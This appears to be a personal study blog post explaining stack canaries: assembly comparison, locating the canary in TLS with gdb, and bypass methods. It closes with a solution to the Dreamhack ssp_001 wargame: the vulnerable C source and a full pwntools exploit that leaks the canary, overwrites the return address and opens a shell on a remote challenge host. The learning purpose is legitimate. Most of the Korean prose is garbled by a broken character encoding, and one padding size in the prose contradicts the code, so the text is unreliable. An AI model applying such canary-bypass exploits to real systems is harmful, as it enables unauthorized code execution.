---
title:  "TIL : Stack Canary ğŸ¤"
excerpt: "2022.07.20 TIL âœ"
toc: true
toc_sticky: true

categories:
  - TIL
  - Hacking

---

https://dreamhack.io/lecture/courses/112

## Stack Canary

**Stack canary**ëŠ” functionì˜ prologueì—ì„œ **stack bufferì™€ return address ì‚¬ì´ì—** ì„ì˜ì˜ ê°’ì„ ì‚½ì…í•˜ê³ , functionì˜ epilogueì—ì„œ **í•´ë‹¹ ê°’ì´ ë³€ê²½ë˜ì—ˆëŠ”ì§€ë¥¼ í™•ì¸í•˜ëŠ”** ë³´í˜¸ ê¸°ë²•ì´ë‹¤. 

### Assembly ë¹„êµ

Ubuntu 18.04ì˜ gccëŠ” ê¸°ë³¸ì ìœ¼ë¡œ stack canaryë¥¼ ì ìš©í•œë‹¤. compile optionìœ¼ë¡œ `-fno-stack-protector`ë¥¼ ì¶”ê°€í•˜ì—¬ **canaryë¥¼ ë¹„í™œì„±í™”**í•  ìˆ˜ ìˆë‹¤.

Canaryë¥¼ ë¹„í™œì„±í™”í•œ ê²½ìš°ì™€ í™œì„±í™”í•œ ê²½ìš°ì˜ function prologueì™€ epilogueë¥¼ ì‚´í´ë³´ë©´ ì•„ë˜ì™€ ê°™ë‹¤.

- `canary.asm`

```c
push   rbp
mov    rbp,rsp
sub    rsp,0x10
mov    rax,QWORD PTR fs:0x28
mov    QWORD PTR [rbp-0x8],rax
xor    eax,eax
lea    rax,[rbp-0x10]
mov    edx,0x20
mov    rsi,rax
mov    edi,0x0
call   read@plt
mov    eax,0x0
mov    rcx,QWORD PTR [rbp-0x8]
xor    rcx,QWORD PTR fs:0x28
je     0x6f0 <main+70>
call   __stack_chk_fail@plt
leave
ret
```

- `no_canary.asm`

```c
push   rbp
mov    rbp,rsp
sub    rsp,0x10
lea    rax,[rbp-0x8]
mov    edx,0x20
mov    rsi,rax
mov    edi,0x0
call   read@plt
mov    eax,0x0
leave
ret
```

Canaryê°€ í™œì„±í™”ë  ê²½ìš°, function prologueì—ì„œ stack ìƒì˜ `rbp-0x8`ì— `fs:0x28`ì— ì €ì¥ëœ dataë¥¼ ë„£ê³ , function epilogueì—ì„œ **ì´ ê°’ì´ ê¸°ì¡´ì˜ ê°’ê³¼ ê°™ì€ì§€ë¥¼ í™•ì¸**í•˜ëŠ” ê³¼ì •ì„ ê°€ì§ì„ ì•Œ ìˆ˜ ìˆë‹¤.

## Canary ìƒì„± ê³¼ì •

**Canary**ëŠ” processê°€ ì‹œì‘ë  ë•Œ **TLS**ì— ì „ì—­ ë³€ìˆ˜ë¡œ ì €ì¥ë˜ê³ , ê° functionì˜ prologueì™€ epilogueì—ì„œ ì´ ê°’ì„ ì°¸ì¡°í•œë‹¤.

<aside>
ğŸ’¡ **TLS(Thread Local Storage)**ëŠ” canaryë¥¼ ë¹„ë¡¯í•œ process ì‹¤í–‰ì— í•„ìš”í•œ ì—¬ëŸ¬ dataê°€ ì €ì¥ëœë‹¤. LinuxëŠ” `fs`ë¥¼ TLSë¥¼ ê°€ë¦¬í‚¤ëŠ” pointerë¡œ ì‚¬ìš©í•œë‹¤.

</aside>

### TLSì˜ ì£¼ì†Œ íŒŒì•…

`fs`ê°€ TLSë¥¼ ê°€ë¦¬í‚¤ë¯€ë¡œ `fs`ì˜ ê°’ì„ ì•Œë©´ TLSì˜ ì£¼ì†Œë¥¼ ì•Œ ìˆ˜ ìˆìœ¼ë‚˜, `fs`ëŠ” ì¼ë°˜ì ì¸ ë°©ì‹ìœ¼ë¡œ ê°’ì„ ì•Œ ìˆ˜ ì—†ë‹¤. ëŒ€ì‹ , `fs`ì˜ ê°’ì„ ì„¤ì •í•  ë•Œ í˜¸ì¶œë˜ëŠ” `arch_prctl(int code, unsigned long addr)` system callì— break pointë¥¼ ì„¤ì •í•˜ì—¬ `fs`ì˜ ê°’ì„ ì•Œì•„ë³¼ ìˆ˜ ìˆë‹¤. (`arch_prctl(ARCH_SET_FS, addr)`ëŠ” `fs`ì˜ ê°’ì„ `addr`ë¡œ ì„¤ì •í•œë‹¤.)

```c
$ gdb -q ./canary
pwndbg> catch syscall arch_prctl
Catchpoint 1 (syscall 'arch_prctl' [158])
pwndbg> run
```

catchpointì—ì„œ rsiì˜ ê°’ì´ TLSì˜ ê°’ì´ê³ , `fs`ëŠ” ì´ë¥¼ ê°€ë¦¬í‚¤ê²Œ ëœë‹¤. 

```c
Catchpoint 1 (call to syscall arch_prctl), 0x00007ffff7dd6024 in init_tls () at rtld.c:740
740	rtld.c: No such file or directory.
 â–º 0x7ffff7dd4024 <init_tls+276>    test   eax, eax
   0x7ffff7dd4026 <init_tls+278>    je     init_tls+321 <init_tls+321>
   0x7ffff7dd4028 <init_tls+280>    lea    rbx, qword ptr [rip + 0x22721]
pwndbg> info register $rdi
rdi            0x1002   4098          // ARCH_SET_FS = 0x1002
pwndbg> info register $rsi
rsi            0x7ffff7fdb4c0   140737354032320 
pwndbg> x/gx 0x7ffff7fdb4c0+0x28
0x7ffff7fdb4e8:	0x0000000000000000
```

canaryê°€ ì €ì¥ë  `fs+0x28`ì—ëŠ” ì•„ì§ ì–´ë– í•œ ê°’ë„ ì €ì¥ë˜ì–´ìˆì§€ ì•Šë‹¤.

### Canary ê°’ ì„¤ì •

gdbì˜ `watch` ëª…ë ¹ì–´ëŠ” íŠ¹ì • ì£¼ì†Œì— ì €ì¥ëœ ê°’ì´ ë³€ê²½ë˜ë©´ processë¥¼ ì¤‘ë‹¨í•œë‹¤.

```c
pwndbg> watch *(0x7ffff7fdb4c0+0x28)
Hardware watchpoint 4: *(0x7ffff7fdb4c0+0x28)
```

watchpointì—ì„œ TLS+0x28ì˜ ê°’ì„ ì¡°íšŒí•˜ë©´ canaryì˜ ê°’ì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.

**Canaryì˜ ì²« ë°”ì´íŠ¸ëŠ” ì¼ë°˜ì ìœ¼ë¡œ `\x00`ì´ë‹¤**. â†’ attckerì˜ payload ë‚´ì— stringì˜ terminator character ì¤‘ í•˜ë‚˜ê°€ í¬í•¨ë˜ë©´ ê±°ê¸°ì„œ ì…ë ¥ì´ ëŠì–´ì§€ëŠ” ì ì„ ì´ìš©í•´ canaryë¥¼ overwriteí•˜ëŠ” ê²ƒì„ ë°©ì§€í•˜ê¸° ìœ„í•¨ì„.

## Canary ìš°íšŒ

### Brute Force

x64 architectureì—ì„œëŠ” 8 byteì˜ canaryê°€, x86 architectureì—ì„œëŠ” 4 byteì˜ canaryê°€ ìƒì„±ëœë‹¤. ê° canaryì—ëŠ” **NULL byteê°€ í¬í•¨**ë˜ë¯€ë¡œ ì‹¤ì œë¡œëŠ” ê°ê° 7 byte, 3 byteì˜ random valueê°€ í¬í•¨ëœë‹¤. â†’ **í˜„ì‹¤ì ìœ¼ë¡œ brute forceë¡œëŠ” ì•Œì•„ë‚´ê¸° í˜ë“¤ë‹¤.**

### TLS ì ‘ê·¼

TLSì˜ ì£¼ì†ŒëŠ” ë§¤ ì‹¤í–‰ë§ˆë‹¤ ë°”ë€Œì§€ë§Œ, **ì‹¤í–‰ ì¤‘ì— TLSì˜ ì£¼ì†Œë¥¼ ì•Œ ìˆ˜ ìˆê³  ì„ì˜ ì£¼ì†Œì— ëŒ€í•œ ì½ê¸° ë˜ëŠ” ì“°ê¸°ê°€ ê°€ëŠ¥í•˜ë‹¤ë©´** canary ê°’ì„ ì½ê±°ë‚˜ ë³€ê²½í•  ìˆ˜ ìˆë‹¤. ê·¸ ë’¤ stack buffer overflowë¥¼ ì¼ìœ¼í‚¬ ë•Œ canary ê°’ì„ TLSì—ì„œ ì½ì–´ë‚¸ ê°’ í˜¹ì€ ì¡°ì‘í•œ ê°’ìœ¼ë¡œ ë®ì–´ ì“°ë©´ canary ê²€ì‚¬ë¥¼ ìš°íšŒí•  ìˆ˜ ìˆë‹¤.

### Stack canary leak

Stack ìƒì˜ canaryë¥¼ ì½ì„ ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì´ ìˆë‹¤ë©´, ì´ë¥¼ ì´ìš©í•œë‹¤.

- Buffer overflowë¥¼ í†µí•´ **canary ë‚´ì˜ NULL byteë§Œì„ ì§€ì›Œ** canaryì— ì ‘ê·¼í•´ canaryë¥¼ ì½ê³ , ë‹¤ì‹œ bufferë¥¼ overwriteí•˜ì—¬ canaryì˜ ê°’ì„ ë³µêµ¬í•˜ì—¬ canary ê²€ì‚¬ë¥¼ ìš°íšŒí•  ìˆ˜ ìˆë‹¤.

## Wargame: [ssp_001](https://dreamhack.io/wargame/challenges/33/)

### ë¬¸ì œ ì½”ë“œ

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}
void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(30);
}
void get_shell() {
    system("/bin/sh");
}
void print_box(unsigned char *box, int idx) {
    printf("Element of index %d is : %02x\n", idx, box[idx]);
}
void menu() {
    puts("[F]ill the box");
    puts("[P]rint the box");
    puts("[E]xit");
    printf("> ");
}
int main(int argc, char *argv[]) {
    unsigned char box[0x40] = {};
    char name[0x40] = {};
    char select[2] = {};
    int idx = 0, name_len = 0;
    initialize();
    while(1) {
        menu();
        read(0, select, 2);
        switch( select[0] ) {
            case 'F':
                printf("box input : ");
                read(0, box, sizeof(box));
                break;
            case 'P':
                printf("Element index : ");
                scanf("%d", &idx);
                print_box(box, idx);
                break;
            case 'E':
                printf("Name Size : ");
                scanf("%d", &name_len);
                printf("Name : ");
                read(0, name, name_len);
                return 0;
            default:
                break;
        }
    }
}
```

### Vulnerability Scanning

**Print the box** ë©”ë‰´ë¥¼ í†µí•´ **canaryì— ì ‘ê·¼**í•  ìˆ˜ ìˆê³ , **Exit** ë©”ë‰´ë¥¼ í†µí•´ **stack buffer overflow**ë¥¼ ì¼ìœ¼í‚¬ ìˆ˜ ìˆë‹¤.

ë”°ë¼ì„œ **canaryì˜ ê°’ì„ ìš°ì„  ì½ì–´ë‚´ê³ , ì´ canaryì˜ ê°’ì„ payloadì— í¬í•¨í•˜ì—¬ canaryì™€ return addressë¥¼ ì›í•˜ëŠ” ê°’ìœ¼ë¡œ overwriteí•œë‹¤.**

### Stack frame êµ¬ì¡° íŒŒì•…í•˜ê¸°

gdbë¥¼ í†µí•´ memoryì˜ êµ¬ì¡°ë¥¼ íŒŒì•…í•˜ë©´, stackì˜ êµ¬ì¡°ê°€ ì•„ë˜ì™€ ê°™ìŒì„ ì•Œ ìˆ˜ ìˆë‹¤.

| STACK (ìœ„ìª½ì´ stack top) |
| --- |
| box[0x40] |
| name[0x40] |
| CANARY (0x4 bytes) |
| dummy data (0x4 bytes) |
| SFP (0x4 bytes) |
| RET (0x4 bytes) |

### Shellcode

ë¬¸ì œì—ì„œ `get_shell()` í•¨ìˆ˜ê°€ ì£¼ì–´ì§€ë¯€ë¡œ gdbë¡œ `get_shell()`ì˜ ì£¼ì†Œë§Œ í™•ì¸í•˜ë©´ ëœë‹¤. ì´ ê³¼ì • ì—­ì‹œ exploit codeì— í¬í•¨í•  ìˆ˜ ìˆë‹¤. (í›„ìˆ )

### Payload êµ¬ì„±í•˜ê¸°

Stack frameì˜ êµ¬ì¡°ì— ë§ì¶”ì–´ **dummy data 0x80 bytes + ì½ì–´ë‚¸ canary + dummy data 0x8 bytes + `get_shell`ì˜ address**ë¡œ êµ¬ì„±í•˜ë©´ ëœë‹¤.

### Exploit

Menu ìƒì˜ **print the box**ë¥¼ ì´ìš©í•´ **canaryë¥¼ í•œ byteì”© ì½ì–´ë‚¼ ìˆ˜ ìˆë‹¤**. ì´ë¥¼ í†µí•´ canaryë¥¼ íšë“í•œë‹¤. ì´í›„ payloadë¥¼ ì‘ì„±í•´ exploití•œë‹¤.

```python
from pwn import *

p = remote("host3.dreamhack.games", 14769)
#p = process("./ssp_001")
e = ELF("./ssp_001")

get_shell = e.symbols["get_shell"]

p.recvuntil("[E]xit")
p.sendline("P")
p.recvuntil("index : ")
p.sendline("131")
p.recvuntil(" is : ")
cnry = p.recvn(2)

p.recvuntil("[E]xit")
p.sendline("P")
p.recvuntil("index : ")
p.sendline("130")
p.recvuntil(" is : ")
cnry += p.recvn(2)

p.recvuntil("[E]xit")
p.sendline("P")
p.recvuntil("index : ")
p.sendline("129")
p.recvuntil(" is : ")
cnry += p.recvn(2)

cnry += b'00'

payload = b"A"*0x40             # |    name    | <= "A" * 0x40
payload += p32(int(cnry, 16))   # |   Canary   | <= Canary
payload += b"A"*0x8             # | SFP & dummy| <= "A" * 0x8
payload += p32(get_shell)       # | Return addr| <= &get_shell

p.recvuntil("[E]xit")
p.sendline("E")
p.recvuntil("Name Size : ")
p.sendline(str(len(payload)))
p.recvuntil("Name : ")

p.sendline(payload)

p.interactive()
```

`e = ELF("./ssp_001")` â†’ `get_shell = e.symbols["get_shell"]` ë¥¼ í†µí•´ gdbë¥¼ ì‚¬ìš©í•˜ì§€ ì•Šê³ ì„œë„ symbolì˜ ì£¼ì†Œë¥¼ ì•Œì•„ë‚¼ ìˆ˜ ìˆë‹¤.